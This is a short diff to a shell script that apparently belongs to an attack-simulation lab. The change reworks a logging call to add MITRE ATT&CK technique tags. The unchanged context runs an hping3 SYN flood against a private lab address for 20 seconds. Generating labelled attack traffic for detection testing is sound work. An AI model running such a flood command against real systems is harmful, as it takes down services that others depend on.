@@ -5,7 +5,7 @@ set -e
 source /scripts/attacks/lib.sh
 
 SCENARIO="dos_synflood"
-log_event "$SCENARIO" "start" "\"attack_category\":\"dos\",\"src_ip\":\"172.28.0.20\",\"dst_ip\":\"172.28.0.10\",\"tool\":\"hping3\""
+log_event "$SCENARIO" "start" "dos" "172.28.0.10" "hping3" "TA0040/T1498 (T1499.001)"
 
 timeout 20 hping3 -S -p 80 --flood 172.28.0.10 || true
 
